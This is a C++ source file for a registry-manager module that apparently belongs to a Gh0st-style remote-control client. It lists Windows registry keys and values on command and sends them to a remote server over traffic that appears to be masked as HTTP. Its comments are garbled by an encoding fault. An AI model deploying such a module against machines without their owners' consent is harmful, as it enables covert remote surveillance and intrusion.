// RegisterManager.cpp: implementation of the CRegisterManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "RegisterManager.h"
#include "Common.h"
#include <IOSTREAM>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CRegisterManager::CRegisterManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
{
    BYTE bToken=TOKEN_REGEDIT;
    HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
    m_ClientObject->Send2Server((char*)&bToken, 1, &mask);
}

CRegisterManager::~CRegisterManager()
{
    Mprintf("CRegisterManager ����\n");
}

VOID  CRegisterManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
    switch (szBuffer[0]) {
    case COMMAND_REG_FIND:             //������
        if(ulLength>3) {
            Find(szBuffer[1],(char*)(szBuffer+2));
        } else {
            Find(szBuffer[1],NULL);   //Root����
        }
        break;
    default:
        break;
    }
}

VOID CRegisterManager::Find(char bToken, char *szPath)
{
    RegisterOperation  Opt(bToken);
    if(szPath!=NULL) {
        Opt.SetPath(szPath);
    }
    char *szBuffer= Opt.FindPath();
    if(szBuffer!=NULL) {
        m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
        //Ŀ¼�µ�Ŀ¼
        LocalFree(szBuffer);
    }
    szBuffer = Opt.FindKey();
    if(szBuffer!=NULL) {
        //Ŀ¼�µ��ļ�
        m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
        LocalFree(szBuffer);
    }
}
